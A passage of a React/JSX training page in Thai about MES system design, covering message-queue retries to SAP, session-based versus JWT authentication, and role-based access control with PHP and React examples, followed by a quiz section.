    good_qty      <span className="c-fn">DECIMAL</span>(<span className="c-num">10</span>,<span className="c-num">3</span>)  <span className="c-kw">NOT NULL</span>,
    scrap_weight  <span className="c-fn">DECIMAL</span>(<span className="c-num">10</span>,<span className="c-num">3</span>)  <span className="c-kw">DEFAULT</span> <span className="c-num">0</span>,
    status        <span className="c-fn">VARCHAR</span>(<span className="c-num">20</span>)    <span className="c-kw">DEFAULT</span> <span className="c-str">'PENDING'</span>,
    <span className="c-cm">-- PENDING -> SENT -> CONFIRMED / ERROR</span>
    sent_at       <span className="c-fn">DATETIME</span>       <span className="c-kw">NULL</span>
);</div>
            </div></div>
          </div>

          <div className="detail-panel" id="hi4">
            <div className="detail-header" onClick={() => { togglePanel('hi4') }}><h3><span className="hchip hchip-green">วิธีที่ 4</span>{'\u00A0'} Asynchronous Workflow &amp; Message Queue</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-diagram"><div className="hub-diagram-title">Message Queue — Fault-Tolerant Design</div>
                <div className="hflow-row"><span className="hbox hbox-blue">MES บันทึกผล</span><span className="harrow">--&gt;</span><span className="hbox hbox-green">Message Queue<br/><small style={{ fontWeight: '400', fontSize: '10px' }}>RabbitMQ / Azure SB</small></span></div>
                <div className="hflow-row" style={{ marginTop: '8px' }}><span style={{ color: 'var(--text-dim)', fontSize: '11px', width: '90px' }}>SAP Online:</span><span className="hbox hbox-green" style={{ fontSize: '11px' }}>Queue</span><span className="harrow">--&gt;</span><span className="hbox hbox-green" style={{ fontSize: '11px' }}>SAP Online</span><span className="harrow">--&gt;</span><span className="hbox hbox-green" style={{ fontSize: '11px' }}>&#10003; สำเร็จ</span></div>
                <div className="hflow-row" style={{ marginTop: '6px' }}><span style={{ color: 'var(--text-dim)', fontSize: '11px', width: '90px' }}>SAP ล่ม:</span><span className="hbox hbox-amber" style={{ fontSize: '11px' }}>Queue</span><span className="harrow">--&gt;</span><span className="hbox hbox-red" style={{ fontSize: '11px' }}>SAP Offline</span><span className="harrow">--&gt;</span><span className="hbox hbox-amber" style={{ fontSize: '11px' }}>Retry อัตโนมัติ</span></div>
              </div>
              <div className="hub-alert hub-alert-success"><span className="hub-alert-icon">&#10003;</span><div>การผลิตไม่หยุด — Operator ทำงานต่อได้ ข้อมูลจะถูกส่งไป SAP อัตโนมัติเมื่อระบบกลับมา Online</div></div>
            </div></div>
          </div>
        </div>

        
        <div className="hub-section" id="hauth">
          <div className="progress-track"><div className="progress-fill" style={{ width: '100%' }}></div></div>
          <div className="hub-section-header">
            <div className="hub-section-title"><div className="hub-icon-box" style={{ background: 'rgba(167,139,250,0.08)', border: '1px solid rgba(167,139,250,0.2)' }}>&#128081;</div>Authentication &amp; Authorization</div>
            <p className="hub-section-desc">Session vs JWT — วิธีการพิสูจน์ตัวตน และ Role-Based Access Control สำหรับระบบ MES</p>
          </div>

          
          <div className="detail-panel open" id="hau1">
            <div className="detail-header" onClick={() => { togglePanel('hau1') }}><h3><span className="hchip hchip-blue">Core Concept</span>{'\u00A0'} Session vs JWT — เปรียบเทียบ 2 วิธีพิสูจน์ตัวตน</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-two" style={{ marginBottom: '18px' }}>
                <div style={{ background: 'rgba(251,191,36,0.05)', border: '1px solid rgba(251,191,36,0.15)', borderRadius: '12px', padding: '16px' }}>
                  <div style={{ fontSize: '13px', fontWeight: '800', color: 'var(--amber)', marginBottom: '10px' }}>&#128220; Session-Based (ที่ MES ใช้)</div>
                  <ul className="hub-list">
                    <li>State เก็บ <strong>ฝั่ง Server</strong> (DB/Memory)</li>
                    <li>Browser เก็บแค่ SessionID (ไม่มีข้อมูล)</li>
                    <li>ทุก Request → Server ต้อง lookup DB</li>
                    <li>ง่ายต่อการ Revoke (ลบ Session ทันที)</li>
                    <li>เหมาะกับ: Internal Systems, MES, ERP</li>
                  </ul>
                </div>
                <div style={{ background: 'rgba(79,156,249,0.05)', border: '1px solid rgba(79,156,249,0.15)', borderRadius: '12px', padding: '16px' }}>
                  <div style={{ fontSize: '13px', fontWeight: '800', color: 'var(--blue)', marginBottom: '10px' }}>&#128273; JWT (JSON Web Token)</div>
                  <ul className="hub-list">
                    <li>State เก็บ <strong>ฝั่ง Client</strong> (ใน Token เอง)</li>
                    <li>Token มี Payload + Signature ลงนามโดย Server</li>
                    <li>ทุก Request → Server แค่ verify signature</li>
                    <li>Stateless — Scale ได้ง่าย (Microservices)</li>
                    <li>เหมาะกับ: Public API, Mobile App, SAP Integration</li>
                  </ul>
                </div>
              </div>
              <table className="hub-table">
                <thead><tr><th>เกณฑ์</th><th>Session</th><th>JWT</th></tr></thead>
                <tbody>
                  <tr><td>State อยู่ที่ไหน</td><td>Server (DB)</td><td>Client (Token)</td></tr>
                  <tr><td>DB Lookup / Request</td><td>ต้องทุกครั้ง</td><td>ไม่ต้อง (verify signature)</td></tr>
                  <tr><td>Revoke ทันที</td><td>&#10003; ง่ายมาก (ลบ row)</td><td>ยาก (ต้องทำ Blacklist)</td></tr>
                  <tr><td>Scale แนวนอน</td><td>ต้องใช้ Shared Session Store</td><td>&#10003; ง่ายมาก</td></tr>
                  <tr><td>ขนาด per Request</td><td>เล็ก (แค่ ID)</td><td>ใหญ่กว่า (มี Payload)</td></tr>
                </tbody>
              </table>
              <div className="hub-alert hub-alert-info"><span className="hub-alert-icon">&#128161;</span><div>ระบบ MES ใช้ <strong>Session-Based</strong> เพราะ Revoke ทันทีสำคัญมาก (เช่น เมื่อพนักงานออก) และทำงานใน Internal Network ที่ไม่ต้องการ Scale แบบ Microservices</div></div>
            </div></div>
          </div>

          
          <div className="detail-panel" id="hau2">
            <div className="detail-header" onClick={() => { togglePanel('hau2') }}><h3><span className="hchip hchip-amber">Animation</span>{'\u00A0'} Session Flow — ดูการทำงานทีละขั้นตอน</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="csrf-view-toggle">
                <button className="csrf-view-btn atk-active" id="sessBtnLogin" onClick={() => { genShowView('sess','login') }}>&#128274; Login Flow</button>
                <button className="csrf-view-btn" id="sessBtnReq" onClick={() => { genShowView('sess','req') }}>&#128202; ขอข้อมูล (Authenticated)</button>
              </div>
              <div className="csrf-scene show" id="sessLogin">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_sessLogin_1"><div className="csrf-actor-icon">&#129489;</div><div className="csrf-actor-label">Operator</div></div>
                  <div className="csrf-actor" id="actor_sessLogin_2"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                  <div className="csrf-actor" id="actor_sessLogin_3"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label">PHP API</div></div>
                  <div className="csrf-actor" id="actor_sessLogin_4"><div className="csrf-actor-icon">&#128451;</div><div className="csrf-actor-label">SQL Server</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-def" id="sessL1"><div className="step-num step-num-def">1</div><div className="step-text">&#129489; <strong>Operator ส่ง username + password</strong> ไปที่ <span className="step-code-inline">POST /api/auth/login</span></div></div>
                  <div className="csrf-step-item step-def" id="sessL2"><div className="step-num step-num-def">2</div><div className="step-text">&#128187; <strong>PHP ตรวจสอบ:</strong> SELECT user FROM users WHERE username=? → ตรวจ password_hash() ตรงไหม?</div></div>
                  <div className="csrf-step-item step-def" id="sessL3"><div className="step-num step-num-def">3</div><div className="step-text">&#128451; <strong>บันทึก Session:</strong><div className="csrf-inset-code" style={{ color: '#6ee7b7' }}>INSERT INTO sessions (session_id, user_id, role, expires_at)
VALUES ('a7X9mK...', 42, 'OPERATOR', NOW()+8h)</div></div></div>
                  <div className="csrf-step-item step-def" id="sessL4"><div className="step-num step-num-def">4</div><div className="step-text" style={{ color: 'var(--green)' }}>&#127850; <strong>ส่ง Set-Cookie: SessionID=a7X9mK... กลับมา</strong><br/><span style={{ color: 'var(--text-dim)' }}>Browser เก็บ Cookie — พร้อมส่งให้ทุก Request ถัดไปอัตโนมัติ</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('sess','login') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn def-ctrl" id="sessNextBtnLogin" onClick={() => { genStep('sess','login') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('sess','login') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="sessProgLogin">0 / 4 ขั้นตอน</span>
                </div>
              </div>
              <div className="csrf-scene" id="sessReq">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_sessReq_1"><div className="csrf-actor-icon">&#129489;</div><div className="csrf-actor-label">Operator</div></div>
                  <div className="csrf-actor" id="actor_sessReq_2"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                  <div className="csrf-actor" id="actor_sessReq_3"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label">PHP API</div></div>
                  <div className="csrf-actor" id="actor_sessReq_4"><div className="csrf-actor-icon">&#128451;</div><div className="csrf-actor-label">SQL Server</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-def" id="sessR1"><div className="step-num step-num-def">1</div><div className="step-text">&#129489; <strong>Operator คลิกดู Job Orders</strong> → Browser ส่ง Cookie อัตโนมัติ:<div className="csrf-inset-code" style={{ color: '#93c5fd' }}>GET /api/orders
Cookie: SessionID=a7X9mK...</div></div></div>
                  <div className="csrf-step-item step-def" id="sessR2"><div className="step-num step-num-def">2</div><div className="step-text">&#128187; <strong>PHP ตรวจสอบ Session:</strong><div className="csrf-inset-code" style={{ color: '#6ee7b7' }}>SELECT user_id, role FROM sessions
WHERE session_id='a7X9mK...' AND expires_at > NOW()</div></div></div>
                  <div className="csrf-step-item step-def" id="sessR3"><div className="step-num step-num-def">3</div><div className="step-text">&#128451; Session ถูกต้อง → ได้ role = 'OPERATOR' → ตรวจสิทธิ์ RBAC → ดึงเฉพาะ orders ที่มีสิทธิ์</div></div>
                  <div className="csrf-step-item step-def" id="sessR4"><div className="step-num step-num-def">4</div><div className="step-text" style={{ color: 'var(--green)' }}>&#10003; <strong>ส่ง JSON กลับ React → UI แสดงผล</strong><br/><span style={{ color: 'var(--text-dim)' }}>ทั้งหมดนี้เกิดใน milliseconds — ผู้ใช้ไม่รู้สึกถึงความล่าช้า</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('sess','req') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn def-ctrl" id="sessNextBtnReq" onClick={() => { genStep('sess','req') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('sess','req') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="sessProgReq">0 / 4 ขั้นตอน</span>
                </div>
              </div>
            </div></div>
          </div>

          
          <div className="detail-panel" id="hau3">
            <div className="detail-header" onClick={() => { togglePanel('hau3') }}><h3><span className="hchip hchip-purple">RBAC</span>{'\u00A0'} Role-Based Access Control — ใครทำได้อะไร</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <p style={{ color: 'var(--text-dim)', fontSize: '13px', marginBottom: '14px' }}>แทนที่จะให้สิทธิ์รายคน (ยุ่งยาก) ระบบ MES กำหนดสิทธิ์ตาม <strong>Role</strong> — ผู้ใช้แต่ละคนมี 1 Role และสืบทอดสิทธิ์ทั้งหมดจาก Role นั้น</p>
              <div className="hub-diagram">
                <div className="hub-diagram-title">MES Role Hierarchy</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
                    <span className="hbox hbox-red" style={{ minWidth: '100px', justifyContent: 'center' }}>&#128081; Admin</span>
                    <span style={{ color: 'var(--text-dim)', fontSize: '12px' }}>ทุกสิทธิ์ รวมถึง User Management, System Config</span>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
                    <span className="hbox hbox-amber" style={{ minWidth: '100px', justifyContent: 'center' }}>&#128202; Manager</span>
                    <span style={{ color: 'var(--text-dim)', fontSize: '12px' }}>ดู/แก้ไขทุก Line, อนุมัติ NCR/CAR, Export Report</span>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
                    <span className="hbox hbox-blue" style={{ minWidth: '100px', justifyContent: 'center' }}>&#9881;&#65039; Operator</span>
                    <span style={{ color: 'var(--text-dim)', fontSize: '12px' }}>บันทึกผลผลิต/QC ของ Line ตัวเอง เท่านั้น</span>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
                    <span className="hbox hbox-green" style={{ minWidth: '100px', justifyContent: 'center' }}>&#128065;&#65039; Viewer</span>
                    <span style={{ color: 'var(--text-dim)', fontSize: '12px' }}>ดูข้อมูล Read-only ทุก Line แต่แก้ไขไม่ได้</span>
                  </div>
                </div>
              </div>
              <table className="hub-table" style={{ marginTop: '16px' }}>
                <thead><tr><th>สิทธิ์</th><th>Admin</th><th>Manager</th><th>Operator</th><th>Viewer</th></tr></thead>
                <tbody>
                  <tr><td>ดู Dashboard</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--green)' }}>&#10003;</td></tr>
                  <tr><td>บันทึกผลผลิต</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--green)' }}>&#10003; (Line ตัวเอง)</td><td style={{ color: 'var(--red)' }}>&#10007;</td></tr>
                  <tr><td>อนุมัติ NCR</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--red)' }}>&#10007;</td><td style={{ color: 'var(--red)' }}>&#10007;</td></tr>
                  <tr><td>จัดการ User</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--red)' }}>&#10007;</td><td style={{ color: 'var(--red)' }}>&#10007;</td><td style={{ color: 'var(--red)' }}>&#10007;</td></tr>
                  <tr><td>ดูข้อมูล Line อื่น</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--green)' }}>&#10003;</td><td style={{ color: 'var(--red)' }}>&#10007;</td><td style={{ color: 'var(--green)' }}>&#10003;</td></tr>
                </tbody>
              </table>
              <div className="hub-h4" style={{ color: 'var(--cyan)', marginTop: '18px' }}>PHP — ตรวจสิทธิ์ก่อนทุก Endpoint</div>
              <div className="hub-code"><span className="code-label">PHP</span><span className="c-cm">// Middleware ตรวจ Role ก่อนเข้า Handler</span>
<span className="c-kw">function</span> <span className="c-fn">requireRole</span>(<span className="c-var">$pdo</span>, <span className="c-var">$allowedRoles</span>) {
    <span className="c-var">$session</span>  = <span className="c-fn">getSession</span>(<span className="c-var">$pdo</span>);
    <span className="c-kw">if</span> (!<span className="c-fn">in_array</span>(<span className="c-var">$session</span>[<span className="c-str">'role'</span>], <span className="c-var">$allowedRoles</span>)) {
        <span className="c-fn">http_response_code</span>(<span className="c-num">403</span>);
        <span className="c-fn">exit</span>(<span className="c-fn">json_encode</span>([<span className="c-str">'message'</span> =&gt; <span className="c-str">'Insufficient permissions'</span>]));
    }
    <span className="c-kw">return</span> <span className="c-var">$session</span>;
}

<span className="c-cm">// ใน Endpoint อนุมัติ NCR — เฉพาะ Manager/Admin เท่านั้น</span>
<span className="c-var">$sess</span> = <span className="c-fn">requireRole</span>(<span className="c-var">$pdo</span>, [<span className="c-str">'ADMIN'</span>, <span className="c-str">'MANAGER'</span>]);
<span className="c-cm">// ... ทำงานต่อ</span></div>
              <div className="hub-h4" style={{ color: 'var(--cyan)', marginTop: '14px' }}>React — ซ่อน UI ที่ไม่มีสิทธิ์</div>
              <div className="hub-code"><span className="code-label">JSX</span><span className="c-cm">// Context ส่ง role ให้ทุก Component</span>
<span className="c-kw">const</span> { role } = <span className="c-fn">useAuth</span>();

<span className="c-cm">// ซ่อนปุ่ม "อนุมัติ" ถ้าไม่ใช่ Manager/Admin</span>
{[<span className="c-str">'ADMIN'</span>, <span className="c-str">'MANAGER'</span>].<span className="c-fn">includes</span>(role) &amp;&amp; (
  &lt;<span className="c-fn">ApproveButton</span> onClick={handleApprove} /&gt;
)}

<span className="c-cm">// ⚠ ซ่อน UI ไม่พอ! Backend ต้องตรวจด้วยเสมอ</span></div>
              <div className="hub-alert hub-alert-warn"><span className="hub-alert-icon">&#9888;</span><div><strong>สำคัญมาก:</strong> การซ่อน UI ใน React ไม่ใช่ Security — Hacker สามารถเรียก API โดยตรงได้ ต้องตรวจสิทธิ์ที่ <strong>Backend เสมอ</strong> ทุกครั้ง</div></div>
            </div></div>
          </div>
        </div>

        
        <div className="hub-section" id="hquiz">
          <div className="progress-track"><div className="progress-fill" id="quizProgressBar" style={{ width: '0%' }}></div></div>
          <div className="hub-section-header">
            <div className="hub-section-title"><div className="hub-icon-box" style={{ background: 'rgba(52,211,153,0.08)', border: '1px solid rgba(52,211,153,0.18)' }}>&#9998;</div>แบบทดสอบความเข้าใจ</div>
            <p className="hub-section-desc">ทดสอบความเข้าใจครอบคลุมทั้ง 5 หมวดหมู่ — 12 ข้อ</p>
          </div>
          <div className="quiz-wrap">
            <div className="quiz-hdr"><span className="quiz-badge">Quiz</span><h3 id="quizTitle" style={{ fontSize: '16px', fontWeight: '700' }}>แบบทดสอบ</h3></div>
            <div id="quizContent">
              <div className="quiz-q-text" id="quizQ"></div>
              <div className="quiz-opts" id="quizOpts"></div>
              <div className="quiz-fb" id="quizFb"></div>
              <div className="quiz-nav">
                <span className="quiz-prog-text" id="quizProg">ข้อ 1 / 12</span>
                <button className="hub-btn hub-btn-primary" id="quizNextBtn" onClick={() => { nextQuestion() }} style={{ display: 'none' }}>ถัดไป &#8594;</button>
              </div>
            </div>
            <div className="score-card" id="scoreCard">
              <div className="score-num" id="scoreNum">0/12</div>
              <div className="score-lbl" id="scoreLbl"></div>
              <div style={{ marginTop: '20px', display: 'flex', gap: '10px', justifyContent: 'center', flexWrap: 'wrap' }}>
                <button className="hub-btn hub-btn-primary" onClick={() => { restartQuiz() }}>&#128260; ทำใหม่</button>
                <button className="hub-btn hub-btn-ghost" onClick={() => { showHub('harch',document.querySelector('.sub-pill')) }}>&#128218; กลับอ่านเนื้อหา</button>
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
</div>





    </>
  );
}
